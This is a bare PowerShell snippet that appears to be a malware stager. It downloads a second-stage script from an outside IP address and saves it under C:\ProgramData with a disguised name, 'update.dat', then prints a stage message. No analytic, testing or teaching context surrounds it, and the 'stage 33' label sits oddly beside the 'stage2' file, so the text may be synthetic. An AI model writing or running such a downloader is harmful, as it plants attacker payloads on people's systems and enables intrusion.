$Stage2Url = "https://198.51.100.52/stage2.ps1"; $LocalPath = 'C:\ProgramData\update.dat'; Invoke-WebRequest -Uri $Stage2Url -OutFile $LocalPath -UseBasicParsing; Write-Output "stage 33 initialized"
